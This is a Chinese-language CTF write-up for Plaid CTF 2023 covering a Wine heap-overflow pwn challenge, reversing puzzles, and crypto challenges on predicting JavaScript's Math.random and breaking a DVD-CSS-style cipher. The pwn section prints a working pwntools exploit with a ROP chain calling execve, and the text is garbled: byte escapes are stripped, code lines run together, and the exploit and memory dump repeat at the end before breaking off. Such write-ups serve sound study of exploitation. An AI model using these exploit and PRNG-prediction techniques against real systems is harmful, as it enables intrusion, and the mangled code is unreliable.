# Plaid CTF 2023-WP-Polaris战队

> 原文: https://www.ctfiot.com/110554.html
> ID: 110554

在本次2023年的Plaid CTF国际赛上

Emu Exploit, thehackerscrew

Project Sekai ,ARESx 

Arr3stY0u,  idek, n03tack , Lilac , Polaris战队联合参赛

合力组成

if this doesn’t work we’ll get more for next year

联合战队，勇夺第4名的好成绩。

PWN

baby heap question mark

由于wine启动原理和Windows启动程序原理略有不同，所以一开始就要准备wine调试。

通过分析运行的wine程序，其地址使用的是真实地址，汇编指令也是直接执行的，仅仅底层内核进行了转译。因此可以直接使用gdb进行attach调试。

由于wine没有地址随机化，所以很多地址都是固定的，利用起来更加方便。

漏洞点

write功能点没有限制长度，可以造成堆溢出。

int __cdecl main_0(int argc, const char **argv, const char **envp){    ...        v30 = v66;        Src = (void *)*((_QWORD *)&v66 + 1);        v31 = Size;        if ( v62 )          sub_140002920(v26, (__int64)v62, (__int64)v62 >= 0);        v61 = DWORD1(v30);        if ( v24 < v70 )        {          v32 = (void *)v69[v24].buf;          if ( v32 )            memcpy(v32, Src, v31);        }    ...}

00000000 node struc ; (sizeof=0x18, mappedto_50)00000000 size dq ?00000008 buf dq ?00000010 field_10 dq ?00000018 node ends

利用思路

1.通过调试发现，保存node地址的内存刚好在堆里，而且申请的第一个node的堆内存会在该内存之前。因此可以直接利用堆溢出控制node地址结构来实现任意读写。

2.直接覆盖过去时发现程序会执行崩溃，原因是修改了第一个node和node地址结构中间的内存导致了崩溃，由于程序没有地址随机化，因此可以把该部分内存备份下来，下次直接填充备份下来的内存，这样就不会导致程序崩溃。

3.修改node地址结构指向栈地址

4.构建ROP链执行execve(“/getFlag”, NULL, NULL)

#!/usr/bin/python3
# -*- coding:
utf-8 -*-
from pwn import *
context.clear(arch='amd64', os='windows', log_level='debug')
sh = process(['docker', 'run', '--privileged', '--rm', '-i', 'heap2'])
# sh = remote('bhqm.chal.pwni.ng', 1337)
# sh.send(os.popen(sh.recvline().decode()).read().encode())
def add(size):    sh.sendlineafter(b'choice? ', b'1')    sh.sendlineafter(b'size? ', str(size).encode())
def edit(index, content):    sh.sendlineafter(b'choice? ', b'4')    sh.sendlineafter(b'index? ', str(index).encode())    sh.sendlineafter(b'data? ', binascii.b2a_hex(content))
dump_memory = b'x00x00x00x00x00x00x00x00xc0x01x01x00x00x00x00x00lx00x00x00r\.winex00WINEDLLDIR0=)x00x00x00FREEx80x01x01x00x00x00x00x00`x01x01x00x00x00x00x00nux-gnu\winex00WINEUSERNAME=userx00x00H;x01x00x00x00x00x00xbax03x00x00USEx08`<x01x00x00x00x00x00v<x01x00x00x00x00x00x8a<x01x00x00x00x00x00xaa<x01x00x00x00x00x00xbd<x01x00x00x00x00x00xd5<x01x00x00x00x00x00xf2<x01x00x00x00x00x009=x01x00x00x00x00x00L=x01x00x00x00x00x00d=x01x00x00x00x00x00x8b=x01x00x00x00x00x00x9e=x01x00x00x00x00x00xab=x01x00x00x00x00x00xc0=x01x00x00x00x00x00xfb=x01x00x00x00x00x00x16>x01x00x00x00x00x00*>x01x00x00x00x00x00B>x01x00x00x00x00x00P>x01x00x00x00x00x00j>x01x00x00x00x00x00x84>x01x00x00x00x00x00xba>x01x00x00x00x00x00xd7>x01x00x00x00x00x00xfc>x01x00x00x00x00x00-?x01x00x00x00x00x00x00x00x00x00x00x00x00x00HOSTNAME=e7de35656151x00WINEDEBUG=fixme-allx00WINELOADER=/usr/lib/wine/wine64x00WINELOADERNOEXEC=1x00NUMBER_OF_PROCESSORS=16x00PROCESSOR_ARCHITECTURE=AMD64x00PROCESSOR_IDENTIFIER=AMD64 Family 25 Model 80 Stepping 0, AuthenticAMDx00PROCESSOR_LEVEL=25x00PROCESSOR_REVISION=5000x00APPDATA=C:\users\user\Application Datax00CLIENTNAME=Consolex00HOMEDRIVE=C:
x00HOMEPATH=\users\userx00LOCALAPPDATA=C:\users\user\Local Settings\Application Datax00LOGONSERVER=\\E7DE35656151x00SESSIONNAME=Consolex00USERDOMAIN=E7DE35656151x00USERNAME=userx00USERPROFILE=C:\users\userx00COMPUTERNAME=E7DE35656151x00WINEDATADIR=\??\Z:\usr\lib\wine\..\..\share\wine\winex00WINEHOMEDIR=\??\Z:\home\userx00WINECONFIGDIR=\??\Z:\home\user\.winex00WINEDLLDIR0=\??\Z:\usr\lib\x86_64-linux-gnu\winex00WINEUSERNAME=userx00x00x00x00x00x00x00x00x00x00xb8x03x00x00USEx08 @x01x00x00x00x00x006@x01x00x00x00x00x00J@x01x00x00x00x00x00j@x01x00x00x00x00x00}@x01x00x00x00x00x00x95@x01x00x00x00x00x00xb2@x01x00x00x00x00x00xf9@x01x00x00x00x00x00x0cAx01x00x00x00x00x00$Ax01x00x00x00x00x00KAx01x00x00x00x00x00^Ax01x00x00x00x00x00kAx01x00x00x00x00x00x80Ax01x00x00x00x00x00xbbAx01x00x00x00x00x00xd6Ax01x00x00x00x00x00xeaAx01x00x00x00x00x00x02Bx01x00x00x00x00x00x10Bx01x00x00x00x00x00*Bx01x00x00x00x00x00DBx01x00x00x00x00x00zBx01x00x00x00x00x00x97Bx01x00x00x00x00x00xbcBx01x00x00x00x00x00xedBx01x00x00x00x00x00x00x00x00x00x00x00x00x00HOSTNAME=e7de35656151x00WINEDEBUG=fixme-allx00WINELOADER=/usr/lib/wine/wine64x00WINELOADERNOEXEC=1x00NUMBER_OF_PROCESSORS=16x00PROCESSOR_ARCHITECTURE=AMD64x00PROCESSOR_IDENTIFIER=AMD64 Family 25 Model 80 Stepping 0, AuthenticAMDx00PROCESSOR_LEVEL=25x00PROCESSOR_REVISION=5000x00APPDATA=C:\users\user\Application Datax00CLIENTNAME=Consolex00HOMEDRIVE=C:
x00HOMEPATH=\users\userx00LOCALAPPDATA=C:\users\user\Local Settings\Application Datax00LOGONSERVER=\\E7DE35656151x00SESSIONNAME=Consolex00USERDOMAIN=E7DE35656151x00USERNAME=userx00USERPROFILE=C:\users\userx00COMPUTERNAME=E7DE35656151x00WINEDATADIR=\??\Z:\usr\lib\wine\..\..\share\wine\winex00WINEHOMEDIR=\??\Z:\home\userx00WINECONFIGDIR=\??\Z:\home\user\.winex00WINEDLLDIR0=\??\Z:\usr\lib\x86_64-linux-gnu\winex00WINEUSERNAME=userx00x00x00x00x00x00x00x00x00x00x18x02x00x00USEx10Zx00:
x00\x00bx00ax00bx00yx00-x00hx00ex00ax00px00-x00qx00ux00ex00sx00tx00ix00ox00nx00-x00mx00ax00rx00kx00.x00ex00xx00ex00x00x00=x00fx00ix00xx00mx00ex00-x00ax00lx00lx00x00x00Wx00Ix00Nx00Ex00Lx00Ox00Ax00Dx00Ex00Rx00=x00/x00ux00sx00rx00/x00lx00ix00bx00/x00wx00ix00nx00ex00/x00wx00ix00nx00ex006x004x00x00x00Wx00Ix00Nx00Ex00Lx00Ox00Ax00Dx00Ex00Rx00Nx00Ox00Ex00Xx00Ex00Cx00=x001x00x00x00Nx00Ux00Mx00Bx00Ex00Rx00_x00Ox00Fx00_x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00Sx00=x001x006x00x00x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00_x00Ax00Rx00Cx00Hx00Ix00Tx00Ex00Cx00Tx00Ux00Rx00Ex00=x00Ax00Mx00Dx006x004x00x00x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00_x00Ix00Dx00Ex00Nx00Tx00Ix00Fx00Ix00Ex00Rx00=x00Ax00Mx00Dx006x004x00 x00Fx00ax00mx00ix00lx00yx00 x002x005x00 x00Mx00ox00dx00ex00lx00 x008x000x00 x00Sx00tx00ex00px00px00ix00nx00gx00 x000x00,x00 x00Ax00ux00tx00hx00ex00nx00tx00ix00cx00Ax00Mx00Dx00x00x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00_x00Lx00Ex00Vx00Ex00Lx00=x002x005x00x00x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00_x00Rx00Ex00Vx00Ix00Sx00Ix00Ox00Nx00=x005x000x000x000x00x00x00Ax00Px00Px00Dx00Ax00Tx00Ax00=x00hx00x00x00USEx08'SYS_execve = 59
add(3)edit(0, flat({0:
dump_memory, 0xa10:
p64(4) + p64(0x21fad8) + p64(4)}, filler=b'0'))edit(0, flat([    0x00000003af6b3fa9, 0,          # pop rdx; add eax, 0x7e0f6600; ret;    0x00000003af686040, SYS_execve, # pop rax; ret;    0x00000003af686177, 0x21fb20,   # pop rdi; ret;    0x00000003af68655a, 0,          # pop rsi; ret;    0x00000003af67bb76,             # syscall;    b'/getFlag0',                  # execve("/getFlag", NULL, NULL)]))
sh.interactive()

Reverse

The Check

题目中给出了一个名为check的二进制文件。

可以猜到这是一个flag判定程序。

> file checkcheck: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b642c20c8b33d5ad6da327870a4840d6a70407e7, for GNU/Linux 3.2.0, stripped

直接执行二进制文件时回输出fail。并且它并不从stdin获取输入。

因此，可以推断它以环境变量、文件或进程参数来输入。

如果跟踪strlen的返回值，可以看到它将与0x10比较。

因此，可以推断出程序使用启动参数作为输入。

import sys
PIE_BASE = 0x555555554000
breakpoints = [0xec56] #CMP R12,qword ptr [RAX]
gdb.execute('file check')gdb.execute('set pagination off')
for bp in breakpoints:    gdb.execute(f'b *{PIE_BASE + bp}')
flag = ['_'] * 16index = 0
while True:    if flag[index] != '_':        index = (index + 1) % 16        continue
    counts = []    for ch in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-':        flag[index] = ch
        gdb.execute(f'starti "{"".join(flag)}"')
        count = 0        while True:            try:                gdb.execute('c')            
except:                break            count += 1                sys.stderr.write(f'ATTEMPT FLAG:{"".join(flag)}, COUNT:{count}n')
        counts.append((count, ch))        flag[index] = '_'    if len(set(map(lambda x: x[0], counts))) != 1:        flag[index] = sorted(counts, key=lambda x: x[0], reverse=True)[0][1]        sys.stderr.write(f'CURRENT FLAG: {"".join(flag)}n')        index = (index + 1) % 16

在该位置设置断点，并以字节为单位对输入值进行精细控制。

在断点处采用常用可打印字符。

如果从索引 开始会失败，因为断点将为每个字符停止相同次数。

这是通过在0-15范围内查找一个有效索引，然后查找下一个有效索引，以此类推来完成的。

Treasure Map

在我们看到check()函数之前，有大量的javascript文件，从0.js开始，依次递增到199.js，以及另外两个success.js和fail.js（尽管没有在图片中显示）。

success.js和fail.js只是分别在网页上打印成功或失败。

check()函数的作用如下:

验证输入的起始是否为PCTF{，结尾是否为}

检查花括号内的字符串长度是否为25，然后将其作为charArray存储在window.buffer

从./0.js中调用go()

我们可以随机模拟一个过程

PCTF{1234567890123456789012345}

然后继续。

让我们来看看./0.js文件：

const b64 = AB...=;
export const go = async () => {    const bti = b64.trim().split("n").reduce((acc, x, i) => (acc.set(x, i), acc), new Map());    const upc = window.buffer.shift();    const moi = await fetch(import.meta.url).then((x) => x.text())    const tg = await fetch(moi.slice(moi.lastIndexOf("=") + 1)).then((x) => x.json())    const fl = tg.mappings.split(";").flatMap((v, l) =>v.split(",").filter((x) => !!x).map((input) => input.split("").map((x) => bti.get(x)).reduce((acc, i) => (i & 32 ? [...acc.slice(0, -1), [...acc.slice(-1)[0], (i & 31)]] : [...acc.slice(0, -1), [[...acc.slice(-1)[0], i].reverse().reduce((acc, i) => (acc << 5) + i, 0)]].map((x) => typeof x === "number" ? x : x[0] & 0x1 ? (x[0] >>> 1) === 0 ? -0x80000000 : -(x[0] >>> 1) : (x[0] >>> 1)).concat([[]])), [[]]).slice(0, -1)).map(([c, s, ol, oc, n]) => [l,c,s??0,ol??0,oc??0,n??0]).reduce((acc, e, i) => [...acc, [l, e[1] + (acc[i - 1]?.[1]??0), ...e.slice(2)]], [])).reduce((acc, e, i) => [...acc, [...e.slice(0, 2), ...e.slice(2).map((x, c) => x + (acc[i - 1]?.[c + 2] ?? 0))]], []).map(([l, c, s, ol, oc, n], i, ls) => [tg.sources[s],moi.split("n").slice(l, ls[i+1] ? ls[i+1]?.[0] + 1 : undefined).map((x, ix, nl) => ix === 0 ? l === ls[i+1]?.[0] ? x.slice(c, ls[i+1]?.[1]) : x.slice(c) : ix === nl.length - 1 ? x.slice(0, ls[i+1]?.[1]) : x).join("n").trim()]).filter(([_, x]) => x === upc).map(([x]) => x)?.[0] ?? tg.sources.slice(-2, -1)[0];    import(./${fl}).then((x) => x.go());}//# sourceMappingURL=0.js.map

让我们逐行的观察代码。

在文件的顶部声明了一个由换行符分隔的const b64 = A-Za-z0-9+/=

然后在go()的第一行，const bti = b64…

是有定义的，但还很难理解它是什么。

接下来，

const upc

被赋予值window.buffer.shift()

这是我们的输入。这从我们的输入中取下一个字符，在我们的例子中是1

在const moi上

import.meta.url是包含模块url的元数据

在本例中为./0.js。

在获取这个模块后，moi给出了这个文件的text()，

所以moi包含了整个javascript源代码。

moi = const b64 =… … 

//#sourceMappingURL=0.js.map

const tg取moi最后一个=出现之后的字符串，也就是0.js.map。

它获取存储在这个文件中的json。

const fl做了一些非常模糊的计算，如果你能通过静态分析理解它做了什么，就会得到额外的分数。

最后，它导入并运行另一个go()函数，使用const fl作为文件名。

这是通过静态分析所能得出的结论。让我们通过动态分析代码来了解更多信息。

在解决Reverse Web题目时，充分利用浏览器是一个很好的技巧。让浏览器的javascript控制台来做繁重的工作。将0.js中的源代码复制到我们的控制台，我们可以查看变量的计算结果。

fl的计算结果为119.js，我们将从那里调用go()函数。

查看其他javascript文件会发现它们都是完全相同的。

因此，从119.js我们将跳转到另一个x.js文件，然后依次下去……等等。

但fl必须以某种方式依赖于我们的输入，否则它总是跳到119.js，这没有意义。

我们搜索（Ctrl+F）字符串upc，它是我们输入的一个片段，应该会影响执行。令人惊讶的是，它只在fl的计算中使用过一次，在最后的filter。

const fl = (heavily obfuscated code).filter(([_, x]) => x === upc).map(([x]) => x)?.[0] ?? tg.sources.slice(-2, -1)[0];

所以filter之前的fl是一个映射，它将下一个要跳转到的文件与一个字符关联起来。

在看到119.js确实是我们输入1时要跳转到的文件后，我们的怀疑得到了证实。

现在，假设我们的输入长度正好是25个字符，我们必须在跳跃25次后到达success.js。

这意味着我们可以倒退，搜索那些可以可以跳转到success.js的javascript文件，并找出其对应的的输入字符。

然后找到可以跳转到该javascript文件的另一个javascript文件，以此类推25次。

但是对于200个javascript文件，可能会有大约

200 ** 25 = 3.36e+57个可能的路径，

这是个非常困难的问题。

下面的代码，用于查找哪些文件跳转到success.js。

for (let i = 0; i < 200; i++) {    let moi = await fetch(`./${i}.js`).then((x) => x.text())
    let tg = await fetch(moi.slice(moi.lastIndexOf("=") + 1)).then((x) => x.json())
    let fl = tg.mappings.split(";").flatMap((v, l) =>v.split(",").filter((x) => !!x).map((input) => input.split("").map((x) => bti.get(x)).reduce((acc, i) => (i & 32 ? [...acc.slice(0, -1), [...acc.slice(-1)[0], (i & 31)]] : [...acc.slice(0, -1), [[...acc.slice(-1)[0], i].reverse().reduce((acc, i) => (acc << 5) + i, 0)]].map((x) => typeof x === "number" ? x : x[0] & 0x1 ? (x[0] >>> 1) === 0 ? -0x80000000 : -(x[0] >>> 1) : (x[0] >>> 1)).concat([[]])), [[]]).slice(0, -1)).map(([c, s, ol, oc, n]) => [l,c,s??0,ol??0,oc??0,n??0]).reduce((acc, e, i) => [...acc, [l, e[1] + (acc[i - 1]?.[1]??0), ...e.slice(2)]], [])).reduce((acc, e, i) => [...acc, [...e.slice(0, 2), ...e.slice(2).map((x, c) => x + (acc[i - 1]?.[c + 2] ?? 0))]], []).map(([l, c, s, ol, oc, n], i, ls) => [tg.sources[s],moi.split("n").slice(l, ls[i+1] ? ls[i+1]?.[0] + 1 : undefined).map((x, ix, nl) => ix === 0 ? l === ls[i+1]?.[0] ? x.slice(c, ls[i+1]?.[1]) : x.slice(c) : ix === nl.length - 1 ? x.slice(0, ls[i+1]?.[1]) : x).join("n").trim()])
    if (fl.filter(([x, _]) => x === 'success.js').length > 0) {        console.log(fl)        console.log(i)        console.log(fl.filter(([x, _]) => x === 'success.js'))    }}

值得庆幸的是，路径非常简单，我们可以很容易地向后搜索。

现在我们知道第25个字符应该是!

我们重复25次，得到字符序列

Need+a+map/How+about+200!

我们把这个作为我们的路程，到此完成题目

CSS

点击箭头可以改变字符，范围从a-z_。

在html文件中挖掘，发现了一些关于页面布局的有趣事情

1.在一个div中字符被分成三组

2.这3个字符一共有14组div。

3.在这些父元素中div有一个嵌套的div它包含了很多detailsHTML标签，另外还有4个div。

4.额外的4div有topCSS属性，并以一种奇怪的模糊方式计算，并且它们包含图像数据。

除了组中每个红色箭头的6个div之外，还有一个带有许多detailshtml标签的额外div。

detailshtml标签就像一个可以打开和关闭、显示或隐藏内容的切换符号，它可以改变页面上占用的内容/空间的数量。

在78个这些details标签之后，有4个带有图像数据的div，具有非常奇怪的height和top css属性。

图像数据存储为backgroundcss属性

background:
url('data:
image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMDAiIGhlaWdodD0iNTQwIj48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMCAwSDIwMFY1NDBIMFpNMiA2MlY3OEgxOThWNjJaIi8+PC9zdmc+');

➜  ~ echo "PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMDAiIGhlaWdodD0iNTQwIj48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMCAwSDIwMFY1NDBIMFpNMiA2MlY3OEgxOThWNjJaIi8+PC9zdmc+" | base64 -d<svg xmlns="http://www.w3.org/2000/svg" width="200" height="540"></svg>%

然而，形状的颜色填充是#fff(白色)

这意味着我们看不到它们中的任何一个，因为我们的网页背景也是白色的。

让我们把背景颜色改为灰色。

我们还需要从顶部div删除overflow: hidden css属性以查看path元素。

因为有很多这样的元素堆叠在一起(每14组div中有4个path元素)

让我们抽出一个来看看它是什么样子的。

我已经修改了leftcss属性为200px，以将它拉到右边。

path元素向下移动了！

改变字符组合将垂直移动path元素。

等等，为什么路径元素里少了个bar?

如果我们更仔细地回顾源代码，

有一个鬼鬼祟祟的div通过使用css属性z-index:
0隐藏在所有东西后面。

可以通过增加z-index把它拉到前面，看看它是什么。

正确的文本隐藏在所有路径元素后面，我们必须改变字符组合，直到每个路径元素的所有透明条与文本匹配，显示正确的文本!由于字符组合被分组为3个，因此3个字符中的每个字符只影响它们的4个path元素。

这意味着我们可以简单地在每个组中强制匹配

27 ** 3 = 19683个可能的字符组合，并检查4个path元素是否与后面的正确文本对齐。

为了找出每个path元素应该在哪个垂直位置，我们可以将每个path元素拉到一边，并改变字符组合，直到对齐，然后记录它们的top css属性。

我们可以使用

window.getComputedStyle(pathElement).top

来做到这一点。

然后，我们可以简单地强制字符组合，以便每个path元素排成一行，最终的字符组合应该是我们的flag

以下是javascript代码:

let tops = ['0px', '20px', '-380px', '-60px', '40px', '-20px', '-180px', '-80px', '-80px', '-80px', '-40px', '-60px', '-20px', '-240px', '-140px', '-100px', '-20px', '-20px', '-120px', '-160px', '-380px', '20px', '-20px', '-160px', '-200px', '-80px', '-60px', '-60px', '60px', '-140px', '-60px', '-240px', '60px', '-80px', '-180px', '-60px', '40px', '-60px', '-240px', '-60px', '-220px', '40px', '-260px', '0px', '-20px', '-60px', '-120px', '60px', '-240px', '40px', '-60px', '-20px', '40px', '-60px', '20px', '40px']
for (let n = 0; n < 14; n++) {    let grandparent = document.children.item(0).children.item(1).children.item(0)    let parent = grandparent.children.item(8 + n)    let details = parent.children.item(6)    let done = false    for (let i = 0; i < 26; i++) {        details.children.item(i).open = false    }    for (let i = 0; i < 27; i++) {        for (let j = 26; j < 52; j++) {            details.children.item(j).open = false        }        for (let j = 26; j < 53; j++) {            for (let k = 52; k < 78; k++) {                details.children.item(k).open = false            }            for (let k = 52; k < 79; k++) {                if (window.getComputedStyle(details.children.item(78).children.item(0)).top == tops[n * 4 + 0] && window.getComputedStyle(details.children.item(79).children.item(0)).top == tops[n * 4 + 1] && window.getComputedStyle(details.children.item(80).children.item(0)).top == tops[n * 4 + 2] && window.getComputedStyle(details.children.item(81).children.item(0)).top == tops[n * 4 + 3]) {                    done = true                    break                }                if (k < 78) {                    details.children.item(k).open = true                }            }            if (done) {                break            }            if (j < 52) {                details.children.item(j).open = true            }        }        if (done) {            break        }        if (i < 26) {            details.children.item(i).open = true        }    }}

Crypto

Bivalves

用于加密已知文本的类似LFSR的系统。

我们可以完全忽略key和IV，用分发的密文对明文进行寻码来恢复xorpad，然后使用z3在明文部分的末尾恢复密码状态，扩展xorpad以恢复flag。

Fastrology

题目给了多个javascript程序，

这些程序使用alphabet

并通过

alphabet[Math.floor

(Math.random()*alphabet.length)]

来选择字符串从而产生一个字符串数据。

其任务是恢复内部随机状态，并预测给定明文之前的几个字符。

由于Math.floor()

我们只能得到每次对javascript PRNG调用的高位数。

现有的方法

8-randomness-predictor

XorShift128Plus

他们以更精确的浮点数作为输入并使用z3求解状态，但是该方法由于数据稀疏而速度缓慢。

也就是说，这些实现可以帮助我们理解如何将PRNG状态转换为64位浮点数，反之亦然。

static inline void XorShift128(uint64_t* state0, uint64_t* state1) {    uint64_t s1 = *state0;    uint64_t s0 = *state1;    *state0 = s0;    s1 ^= s1 << 23;    s1 ^= s1 >> 17;    s1 ^= s0;    s1 ^= s0 >> 26;    // s1 = (s1 &lt;< 23) ^ (s1 &gt;> 17) ^ s0 ^ (s0 >> 26)    *state1 = s1;  }

然而，查看nodejs源代码，javascript PRNG有一个128位的状态

每个状态都是之前状态的线性组合。

然后我们可以将PRNG状态中的每一位建模为GF(2)中的数字

一旦我们获得足够的信息，我们就可以在GF(2)中求解方程组来恢复之前的状态。

最后，javascript PRNG一次生成64个随机状态并返回后进先出，

即rng[63]  rng[62]， rng[61]，…，rng[0]， rng[127] …，rng[64]， rng[191]等等。

每个题目还将在给出输出之前对PRNG进行从0到63次的记录，因此我们的解决方案将需要对偏移量进行强力计算，以便我们对PRNG的计算与各自的输出保持一致。

当每个题目的最终答案与前面给出的md5哈希匹配时，我们可以确认我们有正确的偏移量。

剩下的唯一问题就是如何处理每个子题目。

waxing crescent

字母表里有4个字符。给定前缀中的每个字母将告诉我们PRNG输出的最高2位。

在135个样本中，我们有270个约束条件，这足以帮助我们解方程组并恢复原始状态。

bucket_map = {    0: '00',    1: '01',    2: '10',    3: '11'}

new moon

字母表中有13个字符。它不再是2的幂

因此每个字符所暗示的随机状态就不那么清楚了。

然而，通过检查浮动的高位在

[0,1/13)，[1/13,2,13)中的可能范围，并找到哪些高位不会改变

我们就可以每次对可变数量的PRNG位做出适当的约束。超过192个样本，每个样本大约有2.15个期望约束位，我们将有大约413个约束，这足以解决PRNG状态。

bucket_map = {    0: '000', 1: '00', 2: '001',    3: '0', 4: '01', 5: '011',    6: '', 7: '100', 8: '10',    9: '1', 10: '110', 11: '11',    12: '111'}

full moon

现在字母表中有9个字符，但经过一定数量的采样后，

可能会调用Math.random()来向PRNG输出添加噪声。

我们可以为早期的样本生成一个类似于新月的bucket_map，没有噪声，但对于后期的样本，我们需要将字符0-3，4-7的样本分组在一起，并且只强制执行它们共享值的位。字符8将不受噪声的影响，我们可以应用完全约束。

bucket_map = {    0: '000', 1: '00', 2: '0', 3: '01',    4: '', 5: '10', 6: '1', 7: '11',    8: '111'}
noisy_bucket_map = {    0: '0', 1: '0', 2: '0', 3: '0',    4: '', 5: '', 6: '', 7: '',    8: '111'}

waxing gibbous

同样有13个字符，但是字符12的任何实例都将被其他一些随机字符所取代。

相反，我们观察到的所有样本可能原本是12，但被随机分配到其他样本

我们只对具有相同值的位应用约束，不管它是从12更改的还是最初采样的。

bucket_map = {    0: '', 1: '', 2: '??1',    3: '?', 4: '?1', 5: '?11',    6: '', 7: '1', 8: '1',    9: '1',10: '11', 11: '11',    12: '111'}

The Other CSS

题目给我们一个内容扰乱系统算法的简单实现，通常用于加密DVD数据。

这个实现扩展了key的大小为64而不是40，并且在mangle函数中有更多的回合。

值得注意的是，Cipher类实际上是一个xorpad函数，它从给定的密钥和两个LFSR生成一个比特流，并且它的加密和解密功能是等效的，知道xorpad就足以获得一个带有密钥的加密/解密。

Disk A

host_challenge = await self._read_or_fail(rw, 16)challenge_key = host_challenge[:8] # user controlledencrypted_host_nonce = host_challenge[8:] # user controlledcipher = Cipher(authentication_key, Mode.Authentication)host_mangling_key = cipher.encrypt(challenge_key)response = mangle(host_mangling_key, encrypted_host_nonce)await self._write(rw, response)

我们可以多次查询服务器

得到y = mangle(Cipher(k) ^ a, b)，其中:

k是服务器是密码，Cipher(k)是未知的

a和b由用户控制

y是返回给用户的

用z3的符号实现mangle将成功地计算

Cipher(k) ^ a，如此Cipher(k)

大约需要3分钟:

使用64位BitVec表示中间状态，而不是多个8位BitVec作为mix函数，这将更简单、更快

修复a始终为空字节，选择不同b彼此之间有较低的编辑距离将降低求解器的复杂性

代入步骤建模

tabulate作为一个z3.Function

Cipher(k)生成的xorpad可以被计算出来，并且可以被任何对Cipher(k)的调用重用。

这足以完成握手。磁盘数据可以流进并使用从握手中获得的密钥解密，以生成一个.iso文件，该文件可以在VLC中查看该flag。

Disk B

因为我们已经对a.disk进行了完整的解密，所以现在需要一个脱机方法来解密b.disk。

查看a.disk数据，可以获得用于加密每个扇区的xorpad和sector_nonce。

sector_nonce = f.read(8)if len(sector_nonce) == 0:    breaksector_key = mangle(disk_key, sector_nonce)sector_cipher = Cipher(sector_key, Mode.Data)data = sector_cipher.decrypt(f.read(8208))await self._write(rw, stream_cipher.encrypt(data))

我们有多个y = Cipher(mangle(k, n))

a.disk中的每个扇区一个，其中

    y是一个长比特流，由Cipher中的两个LFSR分离而得

    n是a.disk中的固定的nonce

    k是disk_key，也就是我们想要的

class Cipher:    def __init__(self, key_bytes: bytes, mode: Mode):        # ...        key = int.from_bytes(key_bytes, "big")        key_1 = (key & 0xffffff0000000000) >> 40        key_2 = (key & 0x000000ffffffffff)        lfsr_seed_1 = ((key_1 & 0xfffff8) << 1) | 8 | (key_1 & 7)        lfsr_seed_2 = ((key_2 & 0xfffffffff8) << 1) | 8 | (key_2 & 7)        self.lfsr_1 = LFSR(25, lfsr_seed_1, 0x19e4001) # replaces lsfr-17        self.lfsr_2 = LFSR(41, lfsr_seed_2, 0xfdc0000001) # replaces lsfr-25    def _get_lfsr_byte(self) -> int:        byte_1 = self.lfsr_1.next_byte()        byte_2 = self.lfsr_2.next_byte()        # ...        result = byte_1 + byte_2 + self.carry        self.carry = (result >> 8) & 1        return result & 0xff

对于每个扇区，可以使用蛮力恢复密钥

（mangle(k, n)）提供给Cipher。

这可以通过首先假设key1的24-bit值，计算来自lfsr2的位流，然后验证该位流是否可能来自具有taps 0xfdc0000001的LFSR来有效地完成。

如果流是有效的，则可以通过反向运行LFSR来获得key2的其余部分，从而重新生成整个密钥。LFSR的优化实现允许在大约10分钟内计算一个扇区的mangle(k, n)。

在此之后，我们得到y = mangle(k, n)的多个值，其中有多个n和y集，一个共享的未知k。

我们可以将解重用到磁盘A，并使用z3来求解k。由于对n没有控制，求解器需要大约30分钟才能完成。

一旦a.disk的k（即disk_key）被恢复，我们可以重新派生所有的玩家密钥，并使用它们解码b.disk以获得最终flag。


```
int __cdecl main_0(int argc, const char **argv, const char **envp){    ...        v30 = v66;        Src = (void *)*((_QWORD *)&v66 + 1);        v31 = Size;        if ( v62 )          sub_140002920(v26, (__int64)v62, (__int64)v62 >= 0);        v61 = DWORD1(v30);        if ( v24 < v70 )        {          v32 = (void *)v69[v24].buf;          if ( v32 )            memcpy(v32, Src, v31);        }    ...}
00000000 node struc ; (sizeof=0x18, mappedto_50)00000000 size dq ?00000008 buf dq ?00000010 field_10 dq ?00000018 node ends
#!/usr/bin/python3
# -*- coding:
utf-8 -*-
from pwn import *
context.clear(arch='amd64', os='windows', log_level='debug')
sh = process(['docker', 'run', '--privileged', '--rm', '-i', 'heap2'])
# sh = remote('bhqm.chal.pwni.ng', 1337)
# sh.send(os.popen(sh.recvline().decode()).read().encode())
def add(size):    sh.sendlineafter(b'choice? ', b'1')    sh.sendlineafter(b'size? ', str(size).encode())
def edit(index, content):    sh.sendlineafter(b'choice? ', b'4')    sh.sendlineafter(b'index? ', str(index).encode())    sh.sendlineafter(b'data? ', binascii.b2a_hex(content))
dump_memory = b'x00x00x00x00x00x00x00x00xc0x01x01x00x00x00x00x00lx00x00x00r\.winex00WINEDLLDIR0=)x00x00x00FREEx80x01x01x00x00x00x00x00`x01x01x00x00x00x00x00nux-gnu\winex00WINEUSERNAME=userx00x00H;x01x00x00x00x00x00xbax03x00x00USEx08`<x01x00x00x00x00x00v<x01x00x00x00x00x00x8a<x01x00x00x00x00x00xaa<x01x00x00x00x00x00xbd<x01x00x00x00x00x00xd5<x01x00x00x00x00x00xf2<x01x00x00x00x00x009=x01x00x00x00x00x00L=x01x00x00x00x00x00d=x01x00x00x00x00x00x8b=x01x00x00x00x00x00x9e=x01x00x00x00x00x00xab=x01x00x00x00x00x00xc0=x01x00x00x00x00x00xfb=x01x00x00x00x00x00x16>x01x00x00x00x00x00*>x01x00x00x00x00x00B>x01x00x00x00x00x00P>x01x00x00x00x00x00j>x01x00x00x00x00x00x84>x01x00x00x00x00x00xba>x01x00x00x00x00x00xd7>x01x00x00x00x00x00xfc>x01x00x00x00x00x00-?x01x00x00x00x00x00x00x00x00x00x00x00x00x00HOSTNAME=e7de35656151x00WINEDEBUG=fixme-allx00WINELOADER=/usr/lib/wine/wine64x00WINELOADERNOEXEC=1x00NUMBER_OF_PROCESSORS=16x00PROCESSOR_ARCHITECTURE=